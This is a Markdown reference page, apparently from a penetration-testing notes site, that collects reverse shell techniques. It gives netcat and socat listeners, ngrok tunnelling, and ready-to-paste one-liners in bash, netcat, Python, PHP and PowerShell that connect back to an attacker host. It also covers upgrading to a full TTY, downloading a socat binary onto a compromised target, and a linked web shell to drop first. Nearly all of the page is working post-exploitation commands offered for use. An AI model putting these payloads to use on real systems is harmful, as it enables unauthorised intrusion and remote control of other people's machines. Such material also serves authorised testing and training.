---
tags:
  - Reference
---

# :material-console-line: Reverse Shells

<span class="pill pill-medium">post-exploitation</span> <span class="pill pill-info">cheatsheet</span>

Once you have code execution on `$TARGET`, you want a shell back on your box. Set the listener first, fire the one-liner, then upgrade the dumb shell into a real interactive TTY.

!!! abstract "TL;DR"
    `rlwrap nc -lvnp 4444` to listen → fire a bash/python/php one-liner at your `$LHOST:$LPORT` → upgrade to a full TTY with `python pty` + `stty raw -echo`. Set `$LHOST`/`$LPORT` to your listener.

## :material-ear-hearing: Listeners

```bash
rlwrap nc -lvnp 4444          # rlwrap unlocks arrow keys / history in the shell
nc -lvnp 4444                 # plain netcat listener
socat file:`tty`,raw,echo=0 tcp-listen:4444   # socat listener (best for full TTY)
```

!!! tip "No public IP? Tunnel it"
    If the target can't reach your box directly, expose your listener with ngrok and point the payload at the forwarded host: `ngrok tcp 4444` → use the `N.tcp.eu.ngrok.io:PORT` it prints as `$LHOST:$LPORT`.

## :material-console-line: One-liner payloads

=== "Bash"

    ```bash
    bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
    bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
    # if /dev/tcp is unavailable
    0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196
    ```

=== "netcat"

    ```bash
    nc $LHOST $LPORT -e /bin/bash
    # no -e support (busybox/openbsd nc): named-pipe trick
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
    ```

=== "Python"

    ```bash
    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
    ```

=== "PHP"

    ```php
    php -r '$s=fsockopen("$LHOST",$LPORT);exec("/bin/bash -i <&3 >&3 2>&3");'
    php -r '$s=fsockopen("$LHOST",$LPORT);$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'
    ```

=== "PowerShell"

    ```powershell
    powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"
    ```

!!! tip "When you have no reference"
    [revshells.com](https://www.revshells.com/) generates any of these for a given IP/port. [GTFOBins](https://gtfobins.github.io/#+shell) covers spawning shells from restricted binaries.

## :material-arrow-up-bold-box: Upgrading to a full TTY

A raw reverse shell has no job control, no arrow keys, no tab-complete, and Ctrl-C kills it. Upgrade it:

=== "python pty (classic)"

    ```sh
    # 1) spawn a pty on the target
    python3 -c 'import pty;pty.spawn("/bin/bash")'   # no space after import!
    # (try python / python2 too: which python python2 python3)

    # 2) background the shell
    Ctrl-Z

    # 3) on YOUR box: fix local echo, then foreground
    stty raw -echo; fg

    # 4) back in the shell, set term + size
    reset
    export SHELL=bash
    export TERM=xterm-256color        # colour + clear
    stty rows 38 columns 116          # match your window (stty size to read it)
    ```

=== "script (mkin precious)"

    ```sh
    SHELL=/bin/bash script -q /dev/null
    export TERM=xterm-256color
    ```

=== "socat (full TTY in one hop)"

    ```sh
    # Your box
    socat file:`tty`,raw,echo=0 tcp-listen:4444
    # Target box
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
    export TERM=xterm-256color   # sometimes needed
    ```

!!! loot "Ship socat when it's missing"
    No interactive-shell tooling on the box? If you have RCE + `wget`/`curl`, push a static `socat` binary and get a full TTY:

    ```sh
    # Your box
    wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
    sudo python3 -m http.server 80
    # Target box
    wget http://$LHOST/socat; chmod +x socat
    ```

    Static binary collections: [andrew-d](https://github.com/andrew-d/static-binaries), [ZephrFish/static-tools](https://github.com/ZephrFish/static-tools).

### If the upgrade misbehaves

- Use `rlwrap nc -lvnp` for the listener.
- No space after `import` in the `pty.spawn` one-liner.
- Type `stty size; stty raw -echo; fg` all on one line.
- Last resort: use `bash` (not `zsh`) as the login shell when you set up `nc`.

## :material-link-variant: Related

- Getting the initial exec → [Command Injection](../web/command-injection.md), [File Upload](../web/file-upload.md).
- Handy web shell to drop first: [p0wny-shell](https://github.com/flozz/p0wny-shell).
- Reference: [HackTricks – Full TTYs](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys), [GTFOBins](https://gtfobins.github.io/#+shell).
